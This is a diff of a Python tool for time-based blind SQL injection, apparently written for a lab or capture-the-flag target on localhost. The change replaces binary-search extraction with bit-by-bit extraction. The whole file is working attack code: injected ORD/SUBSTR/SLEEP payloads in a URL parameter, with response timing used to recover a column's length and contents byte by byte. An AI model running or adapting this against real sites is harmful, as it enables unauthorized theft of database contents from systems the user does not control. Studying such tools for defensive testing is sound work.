@@ -9,46 +9,31 @@ import time
 TARGET = "http://localhost/?id=4$payload$"
 
 # The payload, which must sleep if (ORD(byte) < $test$). Must contain '$index$' and
-#   '$byte$' where the index being tested and current test ordinal character will be inserted.
-PAYLOAD = "' AND ORD(SUBSTR(CAST(bin as BINARY), $index$ %2B 1, 1)) < $test$ AND SLEEP(0.2) OR '"
+#   '$byte$' where the character index being tested and current test ordinal character will be inserted.
+PAYLOAD = "' AND (ORD(SUBSTR(CAST(emoji as BINARY), $index$ %2B 1, 1)) >> $bit$) %26 1 AND SLEEP(0.2) OR '"
 
 # The payload, which must sleep if (length < $test$).
-#   Must contain '$byte$' where the current test length will be inserted.
-LENGTH_PAYLOAD = "' AND ((LENGTH(CAST(bin as BINARY)) >> (8 * $index$)) %26 0xFF) < $test$ AND SLEEP(0.2) OR '"
+#   Must contain '$bit$' where the index of the current bit being tested will be inserted.
+LENGTH_PAYLOAD = "' AND (LENGTH(CAST(emoji as BINARY)) >> $bit$) %26 1 AND SLEEP(0.2) OR '"
 
 # If a query takes longer than this then the SQL server slept
 SQL_SLEPT_THRESHOLD = 0.2
 
 # Optional output file to store binary data in
-OUTPUT_FILE = "output.png"
+OUTPUT_FILE = ""
 
 ## Config Ends
 
 total_requests = 0
 
 
-def create_tree(arr):
-    """Creates a binary tree from a list of values."""
-    # end of branch
-    if len(arr) == 1:
-        return (arr[0],)
-
-    # find the middle index, and element
-    mid = len(arr) // 2
-    root = arr[mid]
-
-    # create the tree recursively
-    return root, create_tree(arr[:mid]), create_tree(arr[mid:])
-
-
-def test(payload="", index="", test=""):
+def test(payload="", index="", bit=""):
     """Test if a generic payload sleeps."""
     url = (TARGET
         .replace("$payload$", payload)
         .replace("$index$", str(index))
-        .replace("$test$", str(test))
+        .replace("$bit$", str(bit))
     )
-    #print(url)
 
     # time query
     start_time = time.time()
@@ -61,37 +46,23 @@ def test(payload="", index="", test=""):
     return elapsed_time > SQL_SLEPT_THRESHOLD
 
 
-def query(tree, **kwargs):
-    """Uses the binary tree provided to query a single byte."""
-    if len(tree) == 1:
-        return tree[0]
+def query_bits(bits=8, **kwargs):
+    """Query a single byte, one bit at a time."""
+    total = 0
 
-    current_test, lower, higher = tree
-    slept = test(test=current_test, **kwargs)
+    # query byte one bit at a time
+    for bit in range(bits):
+        total += test(bit=bit, **kwargs) * 2**bit
 
-    return query(lower if slept else higher, **kwargs)
-
-
-def query_length(byte_tree):
-    length = 0
-
-    # query 64 bit integer one byte at a time
-    for i in range(4):
-        length += query(byte_tree, payload=LENGTH_PAYLOAD, index=i) * 256**i
-        
-    return length
+    return total
 
 
 def main():
     print("[+] Retriving data...")
 
-    # generate binary trees
-    byte_tree = create_tree(list(range(2**8)))
-
     # find length of data
-    length = query_length(byte_tree)
-    print("[+] Fetching", length, "bytes")
-
+    length = query_bits(32, payload=LENGTH_PAYLOAD)
+    print("[+] Fetching", length, "bytes (8 requests per byte)")
     print("[+] ", end="")
 
     try:
@@ -100,14 +71,13 @@ def main():
 
         # fetch data
         for i in range(length):
-            byte = query(byte_tree, payload=PAYLOAD, index=i)
+            byte = query_bits(payload=PAYLOAD, index=i)
 
             if OUTPUT_FILE:
                 f.write(bytes([byte]))
                 print(".", end="", flush=True)
             else:
                 print(chr(byte), end="", flush=True)
-
 
     finally:
         if OUTPUT_FILE:
@@ -118,15 +88,18 @@ def main():
 
 
 if __name__ == "__main__":
-    #if not "$payload$" in TARGET:
-    #    print("Missing '$payload$' in TARGET config string.")
-    #    sys.exit(1)
-    #if not "$index$" in PAYLOAD:
-    #    print("Missing '$index$' in PAYLOAD config string.")
-    #    sys.exit(2)
-    #if not "$ordinal$" in PAYLOAD:
-    #    print("Missing '$ordinal$' in PAYLOAD config string.")
-    #    sys.exit(3)
+    if not "$payload$" in TARGET:
+        print("Missing '$payload$' in TARGET config string.")
+        sys.exit(1)
+    if not "$index$" in PAYLOAD:
+        print("Missing '$index$' in PAYLOAD config string.")
+        sys.exit(2)
+    if not "$bit$" in PAYLOAD:
+        print("Missing '$bit$' in PAYLOAD config string.")
+        sys.exit(3)
+    if not "$bit$" in LENGTH_PAYLOAD:
+        print("Missing '$bit$' in LENGTH_PAYLOAD config string.")
+        sys.exit(4)
 
     try:
         main()
